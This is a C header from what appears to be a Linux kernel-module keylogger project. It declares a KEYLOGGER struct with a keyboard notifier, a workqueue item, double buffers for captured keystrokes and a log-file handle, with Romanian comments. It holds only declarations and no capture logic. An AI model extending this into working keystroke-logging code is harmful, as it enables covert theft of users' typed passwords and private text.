#ifndef STRUCT_KEYLOGGER_H
#define STRUCT_KEYLOGGER_H

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/input.h>
#include <linux/keyboard.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/workqueue.h>
#include <linux/fs.h>
#define TMP_BUFF_SIZE 16
#define BUFF_SIZE 256

    typedef struct KEYLOGGER
    {
        struct file* filename;//avem nevoie de aceasta structura pt ca filp_open intoarce acest tip de date(un fel de FILE* sau fd)
        struct notifier_block key_notifier;
        struct work_struct work_struct;
       // struct work_struct clipboard_work;
        char* keyboard_read_buffer; //acesta este pt colectarea curenta de date
        char* write_buffer; //acesta este pentru scrierea datelor colectate in keyboard_read_buffer
        size_t keyboard_read_buffer_offset;
        loff_t offset_in_file;
        char main_buffer[BUFF_SIZE];
        char back_buffer[BUFF_SIZE];
    }KEYLOGGER;
#endif